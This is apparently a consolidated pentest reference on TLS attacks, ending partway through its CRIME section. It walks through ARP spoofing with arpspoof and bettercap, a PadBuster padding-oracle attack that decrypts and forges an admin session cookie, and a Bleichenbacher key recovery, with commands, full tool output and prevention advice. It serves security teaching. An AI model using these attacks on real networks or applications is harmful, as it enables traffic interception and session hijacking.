---
technique: "TLS Attacks (consolidated reference)"
family: "http-protocol"
severity_hint: "low"
tags: []
consolidated_from: 13
curator_version: 2
review_status: imported-unreviewed
---

# TLS Attacks (consolidated reference)

> Family: **http-protocol** · Severity hint: **low**
> Consolidated from imported operator notes; treat commands and prose as untrusted until reviewed.

Transport-layer / TLS attacks, mostly historical. Low relevance to most modern web-application tests but kept as a reference. For live TLS configuration testing prefer `testssl.sh` or `sslscan`; the sub-sections below are background on specific classic attacks.

## Contents
- [PKI](#pki)
- [TLS 1.2 Handshake](#tls-12-handshake)
- [TLS 1.3](#tls-13)
- [Cryptographic Atks](#cryptographic-atks)
- [SSL Stripping](#ssl-stripping)
- [Compression](#compression)
- [Downgrade Attacks](#downgrade-attacks)
- [Padding Oracles](#padding-oracles)
- [POODLE & BEAST](#poodle--beast)
- [Bleichenbacher & DROWN](#bleichenbacher--drown)
- [CRIME & BREACH](#crime--breach)
- [The Heartbleed Bug](#the-heartbleed-bug)
- [Testing TLS Configuration](#testing-tls-configuration)

## Quick index — payloads & commands
- `python: # Generate a key-pair`
- `TLS_AES_128_GCM_SHA256`
- `python: sudo apt install dsniff`
- `python: sudo arpspoof -i docker0 172.17.0.5`
- `python: $ arp`
- `python: docker run -it --privileged --net=host bettercap/bettercap --version`
- `python: docker run -it  bettercap/bettercap`
- `python: 172.17.0.0/16 > 172.17.0.2  » set arp.spoof.targets 172.17.0.4`
- `bash: $arp`
- `HTTP/2 200 OK`
- `bash: padbuster+-------------------------------------------+`
- `bash: padbuster http://127.0.0.1:1337/admin "AAAAAAAAAAAAAAAAAAAAAJQB/nhNEuPuNC8ox7cN1z0=" 16 -e`
- `bash: sudo apt install maven`
- `python: java -jar apps/bleichenbacher-1.0.1.jar -pcap ./bleichenbacher.pcap`
- `python: ava -jar apps/bleichenbacher-1.0.1.jar -pcap ./bleichenbacher.pcap -executeAttack`
- `python: echo -n 21[...]a8 | awk -F '0303' '{print "0303"$2}'`
- `GET /crime.html?sess=XXXXXX HTTP/1.1`
- `GET /crime.html?sess=aXXXXX HTTP/1.1`
- `GET /crime.html?sess=aaXXXX HTTP/1.1`
- `python: java -jar apps/heartbleed-1.0.1.jar -h`
- `python: bash testssl.sh https://hackthebox.com`

## PKI

### Certificates

- The purpose of certificates is to bind public keys to an identity
- Proves the identity of the pub key owner

### OpenSSL

```python
# Generate a key-pair
openssl genrsa -out key.pem 2048

# Extract the pub key
openssl rsa -in key.pem -pubout > rsa_pub.pem

# Encrypt file
openssl pkeyutl -encrypt -inkey rsa_pub.pem -pubin -in msg.txt -out msg.enc
# Decrypt file 
openssl pkeyutl -decrypt -inkey rsa.pem -in msg.enc > decrypted.txt

# Download certificate of a webserver
openssl s_client -connect hackthebox.com:443 | openssl x509 > hackthebox.pem
# PEM to DER
openssl x509 -outform der -in hackthebox.pem -out hackthebox.der
# PEM to PKCS#7
openssl crl2pkcs7 -nocrl -certfile hackthebox.pem -out hackthebox.p7

# Self-signed cert
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out selfsigned.pem -sha256 -days 365
```

## TLS 1.2 Handshake

### Cipher Suites

In TLS, cipher suites define the cryptographic algorithms used for a connection. That includes the following information:

- The key exchange algorithm
- The method used for authentication
- The encryption algorithm and mode, which provide confidentiality
- The MAC algorithm, which provides integrity protection

---

- **Handshake purpose:** Establishes connection and negotiates secure channel parameters.
- **ClientHello:**
    - Sent by the client to start the handshake.
    - Contains supported TLS version, list of cipher suites, and other info.
- **ServerHello:**
    - Server selects TLS version (≤ client’s version).
    - Chooses a cipher suite from client’s list.
- **Server Certificate:**
    - Sent to prove the server’s identity.
- **ServerKeyExchange (if PFS used):**
    - Shares fresh key material.
    - Contains key share + signature.
- **ServerHelloDone:**
    - Indicates server finished initial negotiation.
- **ClientKeyExchange:**
    - Client sends its key share.
    - Key exchange completed, both sides derive shared secret.
- **ChangeCipherSpec:**
    - Both client and server send this message.
    - Signals that subsequent communication is encrypted with the shared symmetric key.
- **After handshake:**
    - All application data is encrypted and integrity-protected (MAC).

#### Wireshark

`Wireshark /path/to/file.pcap`

## TLS 1.3

### Cipher Suites and Cryptography

Several cryptographic improvements have been made with the new 
version TLS 1.3. These enhancements include the removal of older, less 
secure cryptographic techniques and the addition of newer, more secure 
techniques. TLS 1.3 also includes improved key exchange algorithms and 
support for post-quantum cryptography. In particular, TLS 1.3 only 
supports key exchange algorithms that support PFS.

For instance, a TLS 1.3 cipher suite looks like this:

```
TLS_AES_128_GCM_SHA256
```

It is significantly shorter than TLS 1.2 cipher suites since it only 
specifies the encryption algorithm and mode as well as the hash function
 used for the HMAC algorithm. TLS 1.3 cipher suites do not specify the 
method used for server authentication and the key exchange algorithm.

---

### Handshake

Several changes were introduced in the TLS 1.3 handshake process. 
Some messages have been redesigned for efficiency, while other messages 
have been eliminated completely to reduce the latency and overhead of 
the handshake which enables a faster connection establishment.

Just like in TLS 1.2, the TLS 1.3 handshake begins with the `ClientHello`
 message. However, in TLS1.3 this message contains the client's key 
share in addition to the supported cipher suites. This eliminates the 
need for the `ClientKeyExchange` message later on in the handshake. This key share is contained in an extension that is sent with the `ClientHello` message.

The server responds with the `ServerHello` message that 
confirms the key agreement protocol and specifies the chosen cipher 
suite, just like in TLS 1.2. This message also contains the server's key
 share. A fresh key share is always transmitted here to guarantee PFS. 
This replaces the need for the `ServerKeyExchange` message in TLS1.2, which was required when PFS cipher suites were used. The server's certificate is also contained within the `ServerHello` message.

The handshake concludes with a `ServerFinished` and `ClientFinished` message.

---

**Note:** All messages after the `ServerHello` are already encrypted. Therefore, the TLS 1.3 handshake is significantly shorter than the TLS 1.2 handshake.

---

### Analyzing a TLS 1.3 Handshake in Wireshark

When looking at a TLS 1.3 handshake in Wireshark, the differences to a
 TLS 1.2 handshake become apparent. In particular, we can see that there
 are no  `Certificate` and `ClientKeyExchange` messages since they have been removed:

We can find the client's key share in the `key_share` extension in the `ClientHello`
 message. In this case, the client chooses two different shares for 
different groups. That is because the group is chosen by the server in 
the `ServerHello` message, which the client has not received 
yet. Therefore, the client transmits multiple shares to increase the 
chance of agreement on a group with the server:

The server's key share can be inspected in the `key_share` extension in the `ServerHello` message. The server chooses a group and only transmits its key share for that group:

From this point on, all transmitted data is encrypted, as indicated by the `EncryptedApplicationData` tag in Wireshark.

## Cryptographic Atks

### LUCKY13 Attack

The [Lucky13 attack](https://www.ieee-security.org/TC/SP2013/papers/4977a526.pdf)
 was reported in 2013 and exploits a timing difference in the MAC stage 
when the CBC mode is used. It is similar to padding oracle attacks. To 
prevent padding oracle attacks, TLS servers do not leak a verbose error 
message when the padding is incorrect. Additionally, the server computes
 a MAC even if the padding was incorrect to avoid detectable timing 
differences that would also enable padding oracle attacks. The Lucky13 
attack exploits the fact that this MAC computation also includes the 
incorrect padding bytes, making the MAC computation take slightly longer
 in some cases. This subtle timing difference can be enough to leak 
whether the padding was valid or not, potentially leading to a full 
plaintext recovery. This attack was patched in 2013 by most libraries, 
making up-to-date libraries a sufficient countermeasure. Today, Lucky13 
attacks do not play a role in real-life engagements.

---

### SWEET32 Attack

[Sweet32](https://sweet32.info/) is a `birthday attack`
 against the block ciphers in TLS. The goal of birthday attacks is to 
find a collision in block ciphers with short block lengths of 64 bit. 
Older TLS versions utilize such block ciphers, for instance `Triple-DES`.
 To successfully find a collision, an attacker needs to capture multiple
 hundred gigabytes of traffic, making the attack last multiple days. The
 TLS connection would have to be kept alive for the duration of the 
attack. The attack was reported in 2016 and, just like with Lucky13, 
most libraries patched the underlying issues. The best countermeasure is
 using TLS 1.3, as TLS 1.3 eliminated all weak block ciphers with short 
block lengths.

---

### FREAK Attack

The [Factoring RSA Export Keys (FREAK)](https://freakattack.com/) attack exploits weak encryption that was supported in older TLS versions. SSL 3.0 and TLS 1.0 included `export`
 cipher suites. These cipher suites are deliberately weak to comply with
 regulations in the United States that restricted the export of strong 
cryptographic software. Since these algorithms were already considered 
weak back in the 1990s, they can easily be broken today due to short key
 lengths. Servers vulnerable to the FREAK attack still support such `RSA_EXPORT`
 cipher suites that are weak by today's standard and can be broken. 
Since export cipher suites were removed in TLS 1.2, a sufficient 
countermeasure is disabling support of TLS 1.1 and older.

## SSL Stripping

### **ARP Spoofing**

- **ARP role:** Maps IP addresses to MAC addresses in local networks.
- **Normal process:**
    - Host broadcasts *“Who has IP X?”* (ARP request).
    - Target replies with its MAC address (ARP response).
    - Pair is cached locally for future use.
- **ARP spoofing/poisoning:**
    - Attacker sends forged ARP responses to impersonate another host.
    - Victim caches attacker’s MAC for the target’s IP.
    - Victim traffic meant for target is redirected to attacker.
- **Impact:** Attacker gains **Man-in-the-Middle (MitM)** position.
- **Detection:** Difficult, since no infrastructure changes occur.
- **Tooling:** Can be performed with `arpspoof` (dsniff package).

```python
sudo apt install dsniff
```

The program needs to be run as root. We have to specify the network interface and the IP address we want to impersonate. Let's assume we want to fool the docker container at `172.17.0.2` into thinking that we (running at `172.17.0.1`) are the target of `172.17.0.5`. We can spoof the ARP response by running:

```python
sudo arpspoof -i docker0 172.17.0.5
```

With this command, we periodically broadcast ARP responses saying that we are `172.17.0.5`. If the victim docker container now tries to contact the target of `172.17.0.5`, we successfully spoof the ARP request and fool the victim into thinking we are the target. We can verify this by showing the ARP cache on the 
victim. This can be done using the `arp` command:

```python
$ arp
Address                  HWtype  HWaddress           Flags Mask            Iface
172.17.0.1               ether   02:42:d4:13:6f:40   C                     eth0
172.17.0.5               ether   02:42:d4:13:6f:40   C                     eth0
```

Another tool:

```python
docker run -it --privileged --net=host bettercap/bettercap --version
bettercap v2.32.0 (built for linux amd64 with go1.16.4)
```

```python
docker run -it  bettercap/bettercap
bettercap v2.32.0 (built for linux amd64 with go1.16.4) [type 'help' for a list of commands]   
172.17.0.0/16 > 172.17.0.2  »
```

This time our target is running at `172.17.0.4`. Bettercap excludes internal IP addresses by default, so we need to set an extra option. We can do that and start the ARP spoofer like so:

```python
172.17.0.0/16 > 172.17.0.2  » set arp.spoof.targets 172.17.0.4
172.17.0.0/16 > 172.17.0.2  » set arp.spoof.internal true
172.17.0.0/16 > 172.17.0.2  » arp.spoof on
172.17.0.0/16 > 172.17.0.2  » [13:23:19] [sys.log] [war] arp.spoof arp spoofer started targeting 65534 possible network neighbours of 1 targets.
```

The output tells us that bettercap now spoofs all IP addresses in the target network of 172.17.0.0/16. A quick look at the traffic in Wireshark confirms this. We can see that bettercap sends spoofed ARP responses to the victim for all IP addresses in the target range. This is done over and over again to find the correct timing to poison the victim's ARP cache:

Lastly, let's look at the effect it has on our victim. Before we started the ARP spoofing attack, our victim's ARP cache looked like this:

```bash
$arp
Address     HWtype  HWaddress           Flags Mask   Iface
172.17.0.1  ether   02:42:0e:65:ef:ce   C            eth0
```

We can see that the MAC address corresponding to 172.17.0.1 has changed and now points to our attacker machine at 172.17.0.2, thus we have successfully poisoned the victim's ARP cache. Furthermore, after stopping the attack in bettercap with arp.spoof off, bettercap automatically restores the victim's poisoned ARP cache to the previous state such that no further clean-up is required:

---

### **SSL Stripping Attack**

- **SSL stripping attack:**
    - Conducted after gaining a MitM position (e.g., via ARP spoofing).
    - Forces victim to use **HTTP instead of HTTPS**, exposing data in plaintext.
- **Problem for attacker:**
    - Most web servers auto-redirect HTTP → HTTPS.
    - Without intervention, attacker cannot read encrypted TLS traffic.
- **Attacker’s trick:**
    - Intercept redirect to HTTPS.
    - Modify response so victim stays on HTTP.
    - Attacker still connects to target via HTTPS, maintaining MitM visibility.
        
        
        
- **Impact:** Victim unknowingly sends sensitive data (e.g., credentials) over unencrypted HTTP.
- **Attack setup:**
    - Victim → HTTP → Attacker
    - Attacker → HTTPS → Web server
- **Process:**
    - Victim’s HTTP request forwarded by attacker.
    - Server replies with HTTPS redirect.
    - Attacker suppresses redirect, instead establishes HTTPS with server.
    - Attacker relays data to victim over HTTP.
- **Result:**
    - Web server sees a secure TLS connection (attacker–server).
    - Victim only sees insecure HTTP (victim–attacker).
    - Attacker gains full access to sensitive data (credentials, payment info, etc.).
- Prevention
    
    The HTTP Header `Strict-Transport-Security` (HSTS) can be 
    used to prevent SSL Stripping attacks. This header tells the browser 
    that the target site should only be accessed through HTTPS. Any attempt 
    to access the site via HTTP is rejected by the browser or automatically 
    converted to HTTPS requests. This prevents SSL Stripping attacks for all
     websites that have been visited at least once in the past. If the HSTS 
    header was set, the browser prevents all HTTP communication with the web
     server such that there is no way for the MitM attacker to perform an 
    attack.
    
    **Note:** HSTS does not prevent attacks when 
    visiting a site for the first time. This initial connection can still be
     sent via insecure HTTP, leaving the door open for an SSL Stripping 
    attack.
    
    The HSTS header is set to a value in seconds. This is the time the 
    browser should store that the site can only be accessed via HTTPS. For 
    instance, when accessing `https://www.google.com`, we receive the following response:
    
    The HSTS header is set to a value in seconds. This is the time the 
    browser should store that the site can only be accessed via HTTPS. For 
    instance, when accessing `https://www.google.com`, we receive the following response:
    
    ```
    HTTP/2 200 OK
    Date: Thu, 29 Dec 2022 15:15:38 GMT
    Expires: -1
    Cache-Control: private, max-age=0
    Content-Type: text/html; charset=UTF-8
    Strict-Transport-Security: max-age=31536000
    
    <SNIP>
    ```
    
    We can see the HSTS header in the response. It is set to `31536000`
     seconds, which is exactly one year. So, after accessing the website for
     the first time, all HTTP access is prevented for an entire year.
    
    Additionally, websites can protect subdomains with the `includeSubDomains`
     directive. This tells the web browser to automatically connect to all 
    subdomains using HTTPS, even if they have not been visited before. An 
    example could look like this:
    
    ```
    HTTP/2 200 OK
    Date: Thu, 29 Dec 2022 15:15:38 GMT
    Expires: -1
    Cache-Control: private, max-age=0
    Content-Type: text/html; charset=UTF-8
    Strict-Transport-Security: max-age=31536000; includeSubDomains
    
    <SNIP>
    ```

## Compression

### HTTP Compression

Compression can be applied at the application layer level. In a web 
context, this means applying compression at the HTTP level. More 
specifically, HTTP requests can be compressed by the webserver. This is 
indicated by the `Content-Encoding` HTTP header. This header can be set to the values `gzip`, `compress`, or `deflate` to inform the web browser what kind of compression method was used to compress the data. The web browser is then able to unpack the compressed data and display the web page correctly.

If compression is applied at the HTTP level, the compressed response looks similar to this:

**Note:** Most proxies like Burp automatically detect compressed responses and unpack the response by default. So to view the compressed response, this option needs to be disabled.

### **TLS Compression**

Instead of applying compression at the application layer level, it can also be applied at the TLS level. This means that not only the application layer payload but all application layer data is compressed. In a web context, this means that the whole response is compressed, including all HTTP headers.

Since the compression is applied at the TLS level, it is completely transparent to any web server or web proxy such that we cannot detect it in Burp. However, whether TLS compression is used or not is negotiated in the TLS handshake.

We can see the compression methods supported by the client in the `ClientHello` message in the `Compression Methods` Field:

The compression method is then chosen by the server in the `ServerHello` message:

## Downgrade Attacks

Instead of attacking the more secure later versions of TLS, the 
target of downgrade attacks is to force a victim to use insecure 
configurations of TLS. That can either be an older, potentially weaker 
version of TLS or a flawed cipher suite. After successfully conducting a
 downgrade attack, an attacker can then focus on breaking the weaker 
configuration forced upon the client in a second attack step.

More specifically, downgrade vulnerabilities arise when TLS servers 
support multiple TLS versions to enable older clients that do not 
support the latest TLS version to communicate with the server as well. 
This can potentially be exploited by an attacker to force even clients 
that do support the latest TLS version to downgrade to an older, more 
insecure TLS version.

---

### Cipher Suite Rollback

Cipher suite rollback attacks target SSL 2.0. That is because the 
list of cipher suites transmitted by the client and server during the 
handshake is not integrity protected with a MAC. It is therefore 
possible for a MitM attacker to intercept the `ClientHello` 
message and alter the list of cipher suites in such a way that a weak 
cipher suite is chosen, for instance by providing only export cipher 
suites. He can then forward the handshake message along and the 
handshake will proceed as normal. The connection established between the
 client and server will then use a weak cipher suite that can be broken 
by the attacker.
SSL 3.0 and all TLS versions protect against cipher suite rollback 
attacks by including the list of cipher suites in the MAC of the final 
message of the handshake, thereby providing integrity protection. That 
way, changes made by a MitM attacker are detected before the handshake 
is concluded, leading to an alert and a failed connection establishment.

---

### TLS Downgrade Attacks

The target of TLS downgrade attacks is to force the client into using
 an older and potentially weak TLS version for the connection with a 
server. A MitM attacker can achieve downgrade attacks by continuously 
interfering in the TLS handshake and dropping packets, resulting in a 
handshake failure. After a few failed handshake attempts for TLS 1.2, 
browsers may fall back to TLS 1.1 for connection establishment. The 
attacker can repeat this process until the victim's browser attempts to 
establish a connection using the desired TLS version. Interestingly, 
this is undocumented behavior of web browsers, though it was found to 
work in the past.

Exploits for attacks like POODLE and FREAK utilize a downgrade attack
 as part of their attack chain to target servers running secure TLS 
versions that still support older, vulnerable TLS versions such as SSL 
3.0. To prevent downgrade attacks entirely, support for old TLS versions
 should be removed completely.

**Note:** TLS downgrade attacks are different from HTTP downgrading.

## Padding Oracles

- **Block ciphers** require input to match block size → padding is added.
- **Example:** AES uses 16-byte blocks → 30-byte input needs 2 bytes padding.
- **Issue:** Simple schemes (e.g., appending `FF`) cause ambiguity if plaintext ends with same value as padding.
- **Solution:** Modern padding schemes encode the **padding length**, ensuring correct removal after decryption.

---

#### **Padding Oracles**

- **Cause:** Verbose error messages reveal padding issues in CBC mode.
- **Attack principle:** Attacker forges ciphertexts and brute-forces padding bytes using leaked error info.
- **Impact:** Enables decryption of ciphertexts without the key; in some cases, even encryption of chosen plaintexts.
- **Mechanism:** By modifying the previous block until valid padding occurs, attacker learns intermediate values → recovers plaintext bytes block by block.

#### Tools

[https://github.com/AonCyberLabs/PadBuster](https://github.com/AonCyberLabs/PadBuster)

`sudo apt install padbuster`

#### **Identification**

After logging in with the provided credentials and inspecting the traffic in burp, we can see that the application sets a custom cookie of the form `user=AAAAAAAAAAAAAAAAAAAAAJQB/nhNEuPuNC8ox7cN1z0=`. The cookie looks like base64 encoded content, however, decoding it reveals that it is binary data. After attempting to access the admin panel in the application, we get an `Unauthorized` response:

#### **Exploitation**

```bash
padbuster+-------------------------------------------+
| PadBuster - v0.3.3                        |
| Brian Holyfield - Gotham Digital Science  |
| labs@gdssecurity.com                      |
+-------------------------------------------+

    Use: padbuster URL EncryptedSample BlockSize [options]

<SNIP>
```

PadBuster needs the URL, an encrypted sample, and the block size. We obtained an encrypted sample in the `use`cookie, and we can specify the URL to the admin endpoint. We do not know the block size but we can guess it. We will start with a block size of 16 since that is the block size of AES. In practice, we might have to try different values for the block size if the attack fails. Common block sizes are 8 and 16.

Additionally, we need to specify that the ciphertext is contained within a cookie, which we can do with the `-cookies` flag. If the payload was transmitted in a POST parameter, we would have to use the `-post` parameter.

We can also specify the encoding of the data with the `-encoding` flag. In this case, the data is base64 encoded, which corresponds to the value `0`. This results in the following command:

```bash
padbuster http://127.0.0.1:1337/admin "AAAAAAAAAAAAAAAAAAAAAJQB/nhNEuPuNC8ox7cN1z0=" 16 -encoding 0 -cookies "user=AAAAAAAAAAAAAAAAAAAAAJQB/nhNEuPuNC8ox7cN1z0="<SNIP>

The following response signatures were returned:

-------------------------------------------------------
ID#	Freq	Status	Length	Location-------------------------------------------------------
1	2	401	12	N/A
2 **	254	500	15	N/A
-------------------------------------------------------

Enter an ID that matches the error condition
NOTE: The ID# marked with ** is recommended : 2Continuing test with selection 2

[+] Success: (253/256) [Byte 16]
[+] Success: (256/256) [Byte 15]
[+] Success: (137/256) [Byte 14]
[+] Success: (150/256) [Byte 13]
[+] Success: (159/256) [Byte 12]
[+] Success: (142/256) [Byte 11]
[+] Success: (140/256) [Byte 10]
[+] Success: (219/256) [Byte 9]
[+] Success: (149/256) [Byte 8]
[+] Success: (130/256) [Byte 7]
[+] Success: (157/256) [Byte 6]
[+] Success: (207/256) [Byte 5]
[+] Success: (129/256) [Byte 4]
[+] Success: (149/256) [Byte 3]
[+] Success: (132/256) [Byte 2]
[+] Success: (155/256) [Byte 1]

Block 1 Results:
[+] Cipher Text (HEX): 9401fe784d12e3ee342f28c7b70dd73d
[+] Intermediate Bytes (HEX): 757365723d6874622d7374646e740202
[+] Plain Text: user=htb-stdnt

Use of uninitialized value $plainTextBytes in concatenation (.) or string at /usr/bin/padbuster line 361, <STDIN> line 1.
-------------------------------------------------------
** Finished ***

[+] Decrypted value (ASCII): user=htb-stdnt

[+] Decrypted value (HEX): 757365723D6874622D7374646E740202

[+] Decrypted value (Base64): dXNlcj1odGItc3RkbnQCAg==

-------------------------------------------------------
```

PadBuster looks for differences in the response to tell whether the 
padding was valid or not and asks us to confirm the choice. In this 
case, we can use the suggested value of 2. PadBuster is also able to 
look at the content of the response when the `-usebody` flag is specified. By default, it only looks at the response status code and length.
After doing so, PadBuster successfully executes a padding oracle attack and can decrypt the value contained in the cookie: `user=htb-stdnt`.

We could also tell PadBuster to look for a specific error string to 
determine whether the padding was valid or not. To do so, we can use the
 `-error` flag and provide the error string. In our web application, that would be `-error 'Invalid Padding'`.

#### **Encrypting Custom Value**

From decrypting the cookie, we can deduce that it stores the username of the logged-in user. To access the admin panel, we can attempt to encrypt our own forged cookie for another user, for instance, the `admin` user. To do so, we can use PadBuster's `-plaintext` flag and specify the plaintext we want to encrypt:

```bash
padbuster http://127.0.0.1:1337/admin "AAAAAAAAAAAAAAAAAAAAAJQB/nhNEuPuNC8ox7cN1z0=" 16 -encoding 0 -cookies "user=AAAAAAAAAAAAAAAAAAAAAJQB/nhNEuPuNC8ox7cN1z0=" -plaintext "user=admin" <SNIP>

The following response signatures were returned:

-------------------------------------------------------
ID#	Freq	Status	Length	Location-------------------------------------------------------
1	1	401	12	N/A
2 **	255	500	15	N/A
-------------------------------------------------------

Enter an ID that matches the error condition
NOTE: The ID# marked with ** is recommended : 2Continuing test with selection 2

[+] Success: (97/256) [Byte 16]
[+] Success: (9/256) [Byte 15]
[+] Success: (179/256) [Byte 14]
[+] Success: (174/256) [Byte 13]
[+] Success: (215/256) [Byte 12]
[+] Success: (235/256) [Byte 11]
[+] Success: (61/256) [Byte 10]
[+] Success: (249/256) [Byte 9]
[+] Success: (221/256) [Byte 8]
[+] Success: (192/256) [Byte 7]
[+] Success: (197/256) [Byte 6]
[+] Success: (207/256) [Byte 5]
[+] Success: (96/256) [Byte 4]
[+] Success: (233/256) [Byte 3]
[+] Success: (85/256) [Byte 2]
[+] Success: (192/256) [Byte 1]

Block 1 Results:
[+] New Cipher Text (HEX): 25d77cdf00512e4766aa152a5048f398
[+] Intermediate Bytes (HEX): 50a419ad3d304a2a0fc4132c564ef59e

-------------------------------------------------------
** Finished ***

[+] Encrypted value is: Jdd83wBRLkdmqhUqUEjzmAAAAAAAAAAAAAAAAAAAAAA%3D
-------------------------------------------------------

```

---

### Prevention

Padding Oracle attacks exist because of the improper use of 
cryptographic algorithms. Even if the encryption algorithm is secure, it
 may still be vulnerable if used incorrectly. Therefore it is important 
to know what you are doing when implementing anything related to 
encryption. In particular, padding oracle attacks can be prevented by 
not letting the user know that the padding was invalid. Instead of 
displaying a specific error message about invalid padding, a generic 
error message should be displayed when the decryption fails. The 
application has to behave the exact same way whether the expected 
padding was correct or not. Most importantly, remember that you should "[Never Roll-Your-Own Crypto](https://www.infosecinstitute.com/resources/cryptography/the-dangers-of-rolling-your-own-encryption/)", and instead try to use common encryption libraries.

## POODLE & BEAST

### **Padding in SSL 3.0**

- **POODLE & BEAST:** Padding oracle attacks on SSL 3.0 enabling decryption of network traffic (e.g., credentials).
- **Requirements:** Attacker must intercept ciphertext and communicate with the target server.
- **SSL 3.0 padding scheme:**
    - Last byte = padding length (excl. itself).
    - Other padding bytes = arbitrary values.
- **Example (8-byte block, 4-byte plaintext):**
    - Plaintext: `DE AD BE EF` → needs 4 padding bytes.
    - Result: `DE AD BE EF 00 00 00 03`.
- **Note:** Even if plaintext already fits block size, a full block of padding is added.

---

### **POODLE Attack**

- **Discovered:** 2014 — broke SSL 3.0 entirely.
- **Attack method:**
    - Attacker forces victim to send requests with a full padding block.
    - Last padding byte (length) is known.
    - Attacker modifies last ciphertext block → observes server response.
- **Server behavior:**
    - Wrong padding length → MAC error.
    - Correct padding length → MAC check passes (no error).
- **Result:**
    - Leaks intermediary CBC values → attacker recovers plaintext bytes recursively.
- **Root cause:**
    - Arbitrary padding bytes allowed except last length byte.
    - Distinguishable server errors reveal padding correctness.

---

### **BEAST Attack**

- **Discovered:** 2011, targets SSL/TLS using CBC mode.
- **Attack method:**
    - Attacker intercepts a valid ciphertext.
    - Crafts modified ciphertexts to deduce plaintext block contents.
    - Uses *plaintext injection* to shift data so only one unknown byte remains.
    - Enables brute-forcing plaintext **byte by byte**.
- **Limitation:**
    - Brute-forcing entire blocks is infeasible without injection trick.
- **Practicality:**
    - Mostly theoretical → real-world exploitation is hard.
    - Requires bypassing browser **same-origin policy**, reducing real risk.

---

### **Tools & Prevention**

[https://github.com/tls-attacker/TLS-Breaker](https://github.com/tls-attacker/TLS-Breaker)

```bash
sudo apt install maven
git clone https://github.com/tls-attacker/TLS-Breaker
cd TLS-Breaker/
mvn clean install -DskipTests=true
```

---

### Prevention

POODLE can be prevented by disabling the use of SSL 3.0 entirely. Even if a web server supports newer TLS versions, a client might be able to force the use of SSL 3.0 by manipulating handshake messages. Therefore, SSL 3.0 should be completely disabled and not be supported even for legacy reasons.
`SSLProtocol all -SSlv3`

## Bleichenbacher & DROWN

#### **Bleichenbacher Attack**

- **Target:** RSA encryption with **PKCS#1 padding** (used to add randomness and avoid deterministic encryption).
- **Method:** Attacker sends many modified ciphertexts → server decrypts → attacker observes if PKCS#1 padding is valid (via errors or timing).
- **Goal:** Step-by-step deduction of plaintext until it’s fully recovered.
- **TLS 1.2 context:**
    - Only applies if RSA key exchange is used.
    - Requires server flaw leaking padding validity.
- **Impact:** Can reveal the **session key**, enabling full decryption of TLS traffic.

```python
java -jar apps/bleichenbacher-1.0.1.jar -pcap ./bleichenbacher.pcap

<SNIP>
Found 1 servers from the pcap file.                                                                                                                                                           
┌─────────────┬─────────────┬────────┬─────────────┐                                                                                                                                          
│Server Number│Host Address │Hostname│Session Count│                                                                                                                                          
├─────────────┼─────────────┼────────┼─────────────┤                                                                                                                                          
│            1│127.0.0.1:443│-       │            2│                                                                                                                                          
└─────────────┴─────────────┴────────┴─────────────┘                                                                                                                                          
Do you want to check the vulnerability of the server? (y/n):                                                                                                                                  
y

<SNIP>
Found a behavior difference within the responses. The server could be vulnerable.
The server responds with a different number of protocol messages.
Vulnerable:true
Server 127.0.0.1:443 is vulnerable.
```

```python
ava -jar apps/bleichenbacher-1.0.1.jar -pcap ./bleichenbacher.pcap -executeAttack

<SNIP>
09:35:56 [main] INFO : Bleichenbacher - ====> Solution found!
 
02 14 C0 45 01 95 02 4E  E2 D0 BA 68 2B D9 2B 0A
CD 4E 83 7A 8A BC 60 EE  56 A6 4D 6F 48 FE 2D 51
1C 6A A3 CF E4 14 76 3A  AB DA 7F 4A 41 FB FE 70
D1 02 C5 68 38 55 09 96  5F 43 CC B1 86 25 AD 75
EF AB 27 E7 9C BA DB 9C  DE B5 5D CF E0 92 A1 B7
31 C5 25 9C E6 42 71 E9  AE E5 34 83 C4 38 BA 71
5D D9 6E C6 E5 69 49 C8  4B 29 0D 71 EE 70 12 66
8E 6F DD 71 6E 4E E3 26  1D 1A 98 53 D4 04 6B D7
56 98 42 71 72 2F 74 94  D1 96 27 19 EB A9 A2 BD
E8 6D 1C 3E 83 A6 32 54  64 C4 7D ED B7 E3 25 F2
B5 6D 73 37 76 51 2E EC  F5 2F 9B 25 AB 2D AD 27
E3 42 FE D1 72 0E A9 F3  C8 CC 54 8D DC A4 52 03
D1 2E B7 0D 8D 5B A8 C6  54 F5 30 6F 1F 75 00 03
03 46 E1 07 5D 56 F3 82  82 AE AC F9 E9 FA 02 7F
22 BB FB E4 A8 EC CA EF  E3 9E 5B 55 D9 4F FC 38
52 D6 AE 62 54 77 53 01  B7 19 D2 D5 E0 43 A8
09:35:56 [main] INFO : Bleichenbacher - // Total # of queries so far: 20417
214c0450195024ee2d0ba682bd92b0acd4e837a8abc60ee56a64d6f48fe2d511c6aa3cfe414763...
```

```python
echo -n 21[...]a8 | awk -F '0303' '{print "0303"$2}'
030346e1075d56f38282aeacf9e9fa027f22bbfbe4a8eccaefe39e5b55d94ffc3852d6ae6254775301b719d2d5e043a8
```

Create file with format:
`PMS_CLIENT_RANDOM <client_random> <premaster_secret>`

`Edit -> Preferences -> Protocols -> TLS` and specifying the path to the key file under `(Pre)-Master-Secret log filename`

---

#### **DROWN Attack**

- **DROWN:** A variant of the Bleichenbacher attack exploiting **SSL 2.0**.
- **Execution:** Attacker intercepts many connections, then runs Bleichenbacher attack with crafted handshake messages.
- **Weakness:** SSL 2.0 relied on **export-grade ciphers** (deliberately weak for 1990s regulations), now easily breakable.
- **Extra leverage:** Old OpenSSL bugs make the attack even faster.
- **Scope:** Targets only SSL 2.0 (deprecated), but misconfigured servers may still expose it.

---

### Prevention

DROWN can be prevented by disabling SSL 2.0. Most up-to-date 
operating systems today come with crypto libraries that do not support SSL 2.0 out-of-the-box, so finding web servers vulnerable to DROWN in the wild is very rare, though there might still be a few misconfigured and out-of-date servers out there. Bleichenbacher attacks can be prevented by not revealing padding information to the TLS client. Vulnerable web servers received patches, so keeping web servers up-to-date is sufficient to protect against a plain Bleichenbacher attack.

## CRIME & BREACH

### CRIME

[Compression Ratio Info-leak Made Easy (CRIME)](https://blog.qualys.com/product-tech/2012/09/14/crime-information-leakage-attack-against-ssltls)
 is a compression-based attack that targets TLS compression. As such, it
 can target sensitive information present in the HTTP body and HTTP 
headers such as session cookies. To successfully exploit CRIME, an 
attacker needs to be able to intercept traffic from the victim, as well 
as force the victim to adjust the request parameters slightly, for 
instance via malicious JavaScript code. The attacker also needs to know 
the name of the session cookie and the length of its value.

Let's look at an example to illustrate how the attack works. For our example we make the following assumptions:

- Let's assume the session cookie is called `sess` and has a length of 6 characters. The victim's session cookie's value is `abcdef`
- Our target website is called `crime.local` and we are attacking the path `/crime.html`
- A sliding-window compression algorithm is used that works similarly to LZ77 as discussed in the previous section

